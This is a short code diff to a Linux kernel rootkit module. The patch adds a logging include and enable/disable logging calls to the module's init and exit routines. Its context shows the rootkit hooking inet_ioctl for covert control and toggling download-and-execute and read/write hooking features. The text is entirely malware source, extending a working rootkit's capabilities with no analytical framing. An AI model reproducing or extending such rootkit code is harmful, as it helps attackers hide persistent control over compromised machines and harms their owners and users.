@@ -1,4 +1,5 @@
 #include "common.h"
+#include "logging.h"
 #include <linux/capability.h>
 #include <linux/cred.h>
 #include <asm/uaccess.h>
@@ -1003,6 +1004,9 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     /* Hook inet_ioctl() for rootkit control */
     inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     hijack_start(inet_ioctl, &n_inet_ioctl);
+    
+    
+    enable_logging();
 
     #if defined(_CONFIG_HOOKRW_)
     hookrw_init();
@@ -1032,7 +1036,7 @@ static void __exit mischief_managed ( void )
     #if defined(_CONFIG_DLEXEC_)
     dlexec_exit();
     #endif
-
+    
     #if defined(_CONFIG_HOOKRW_)
     hookrw_exit();
     #endif
@@ -1040,6 +1044,8 @@ static void __exit mischief_managed ( void )
     #if defined(_CONFIG_HOOKTS_)
     hookts_exit();
     #endif 
+    
+    disable_logging();
 
     hijack_stop(inet_ioctl);
     hijack_stop(dev_get_flags);
